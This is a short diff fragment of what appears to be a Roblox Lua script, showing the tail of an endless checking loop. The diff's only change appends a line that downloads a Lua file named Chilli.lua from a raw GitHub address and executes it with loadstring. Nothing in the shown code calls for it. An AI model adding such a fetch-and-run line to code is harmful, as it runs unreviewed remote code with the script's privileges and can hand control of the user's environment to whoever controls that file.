@@ -1552,3 +1552,4 @@ while true do
     wait(2)
     continuousCheck()
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
